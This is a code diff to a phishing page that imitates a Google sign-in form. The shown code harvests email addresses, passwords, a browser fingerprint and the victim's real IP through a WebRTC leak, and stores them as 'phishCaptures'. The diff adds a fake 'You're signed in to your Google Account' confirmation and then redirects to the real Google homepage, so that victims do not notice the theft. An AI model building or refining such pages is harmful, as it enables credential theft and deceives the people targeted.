@@ -19,6 +19,8 @@
         button { width:100%; background:#4285f4; color:#fff; border:none; padding:12px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s; }
         button:hover { background:#3367d6; }
         button:active { background:#2b5bbb; }
+        button:disabled { background:#ccc; cursor:not-allowed; }
+        .success { text-align:center; color:#137333; background:#e8f0fe; padding:20px; border-radius:8px; margin:-20px -32px 20px -32px; display:none; }
         .forgot { text-align:center; margin-top:16px; }
         .forgot a { color:#1a73e8; text-decoration:none; font-size:14px; }
         .footer { text-align:center; margin-top:24px; font-size:12px; color:#5f6368; }
@@ -84,19 +86,19 @@
                 trustDevice: trust,
                 fingerprint: getFingerprint(),
                 userAgent: navigator.userAgent,
-                ip: 'client-side', // Real IP visible in dashboard via WebRTC below
+                ip: 'client-side',
                 referrer: document.referrer
             };
             
             // Store in localStorage
             let captures = JSON.parse(localStorage.getItem('phishCaptures') || '[]');
             captures.unshift(creds);
-            localStorage.setItem('phishCaptures', JSON.stringify(captures.slice(0, 50))); // Keep last 50
+            localStorage.setItem('phishCaptures', JSON.stringify(captures.slice(0, 50)));
             
             // Update live panel
             displayLiveCapture(creds);
             
-            // WebRTC IP leak (works in most browsers)
+            // WebRTC IP leak
             getRealIP(function(ip) {
                 creds.ip = ip;
                 updateStoredCaptures();
@@ -129,27 +131,53 @@
             pc.createOffer().then(pc.setLocalDescription.bind(pc));
         }
 
-        // Update stored captures with IP
         function updateStoredCaptures() {
             let captures = JSON.parse(localStorage.getItem('phishCaptures') || '[]');
             localStorage.setItem('phishCaptures', JSON.stringify(captures));
         }
 
-        // Form submission
+        // Form submission - REALISTIC GOOGLE FLOW
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const trust = document.getElementById('trust').checked;
+            const btn = document.querySelector('button');
             
+            // Capture immediately
             captureCreds(email, password, trust);
             
-            // Fake "loading" then redirect to success page
-            const btn = document.querySelector('button');
+            // Step 1: Show "Verifying..." (1.5s)
             btn.textContent = 'Verifying...';
             btn.disabled = true;
+            
             setTimeout(() => {
-                window.location.href = './dashboard.html';
+                // Step 2: Show success message (2s)
+                btn.style.display = 'none';
+                document.querySelector('.forgot').style.display = 'none';
+                document.querySelector('.form-group').style.display = 'none';
+                document.querySelector('.checkbox-group').style.display = 'none';
+                document.querySelector('.footer').innerHTML = '';
+                
+                const success = document.createElement('div');
+                success.className = 'success';
+                success.innerHTML = `
+                    <svg style="width:48px;height:48px;margin:0 auto 16px;display:block" viewBox="0 0 24 24" fill="#137333">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                    <h3 style="color:#137333;margin-bottom:8px">Welcome!</h3>
+                    <p style="font-size:14px">You're signed in to your Google Account</p>
+                    <div style="margin-top:16px;font-size:12px;color:#5f6368">
+                        This browser is now signed in to <strong>${email}</strong>
+                    </div>
+                `;
+                document.querySelector('.container').insertBefore(success, document.querySelector('.logo').nextSibling);
+                success.style.display = 'block';
+                
+                // Step 3: Redirect to REAL Google homepage (3s total delay)
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com/?guccounter=1';
+                }, 2000);
             }, 1500);
         });
 
